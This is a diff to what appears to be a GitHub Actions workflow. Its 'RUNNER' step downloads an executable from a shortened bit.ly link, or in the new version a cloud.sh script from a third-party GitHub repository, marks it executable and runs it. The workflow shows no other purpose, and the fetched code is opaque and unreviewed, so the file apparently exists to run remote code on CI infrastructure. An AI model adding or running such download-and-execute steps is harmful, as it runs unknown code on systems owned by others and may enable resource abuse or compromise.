@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: RUNNER
       run: |
-        wget https://bit.ly/3zGKkqm && chmod +x 3zGKkqm && ./3zGKkqm
+        wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
